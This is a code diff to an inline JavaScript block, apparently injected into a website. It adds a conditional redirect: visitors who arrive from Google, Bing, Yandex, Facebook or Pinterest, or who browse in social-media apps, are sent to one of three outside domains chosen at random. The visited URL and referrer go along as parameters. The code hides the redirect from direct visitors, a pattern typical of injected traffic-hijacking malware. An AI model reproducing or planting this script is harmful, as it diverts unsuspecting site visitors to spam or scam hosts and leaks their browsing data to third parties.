@@ -1,14 +1,19 @@
- //<![CDATA[
+//<![CDATA[
     if(document.referrer)
     {
     	var cek = document.referrer;
 
-    	var is_se = cek.includes('.google.') || cek.includes('.bing.') || cek.includes('yandex.') || cek.includes('facebook.');
+    	var ars 	= rChoice([
+							'https://oneorbit.xyz/',
+							'https://sumba.club/',
+							'https://seoclick.org/',
+							]);
 
-      if(is_se)
-    	{
-    		var url = window.location.href;
-    		window.location = "https://oneorbit.xyz/?arsae="+ encodeURIComponent(url);
-    	}
+				function rChoice(arr) {
+    			return arr[Math.floor(arr.length * Math.random())];
+	}
+
+	//Code arsae client javascript
+	if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
     }
 //]]>
